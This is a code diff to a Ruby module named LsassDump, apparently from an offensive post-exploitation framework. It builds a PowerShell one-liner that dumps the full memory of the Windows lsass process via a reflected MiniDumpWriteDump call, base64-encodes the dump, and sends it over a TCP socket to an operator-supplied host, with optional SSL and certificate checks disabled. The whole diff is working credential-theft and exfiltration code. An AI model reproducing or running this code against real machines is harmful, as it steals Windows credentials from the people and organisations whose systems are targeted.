@@ -10,14 +10,13 @@ class LsassDump < Poet::Scanner
   self.invasive = true
 
   def psh_command(host,port,ssl)
-    save_path = "c:\\windows\\temp\\#{random_name}.dmp"
-    proc_dump = %(if([IntPtr]::Size -eq 4){$arch='_32_'}else{$arch='_64_'};$comp_name=(gc env:computername)+$arch+'lsass.dmp';$proc = ps lsass;$proc_handle = $proc.Handle;$proc_id = $proc.Id;)
-    proc_dump << %($WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');)
+    proc_dump = %($path=$env:TEMP+"\\#{random_name}.dmp";if([IntPtr]::Size -eq 4){$arch='_32_'}else{$arch='_64_'};$comp_name=(gc env:computername)+$arch+'lsass.dmp';)
+    proc_dump << %($proc = ps lsass;$proc_handle = $proc.Handle;$proc_id = $proc.Id;$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');)
     proc_dump << %($WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';)
     proc_dump << %($MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$MiniDumpWithFullMemory = [UInt32] 2;)
-    proc_dump << %($FileStream = New-Object IO.FileStream('#{save_path}', [IO.FileMode]::Create);)
+    proc_dump << %($FileStream = New-Object IO.FileStream($path, [IO.FileMode]::Create);)
     proc_dump << %($Result = $MiniDumpWriteDump.Invoke($null,@($proc_handle,$proc_id,$FileStream.SafeFileHandle,$MiniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));)
-    proc_dump << %($FileStream.Close();$lsass_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{save_path}"));)
+    proc_dump << %($FileStream.Close();$lsass_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes($path));)
     proc_dump << %($socket = New-Object Net.Sockets.TcpClient('#{host}', #{port.to_i});$stream = $socket.GetStream();)
     if ssl
       proc_dump << %($sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));)
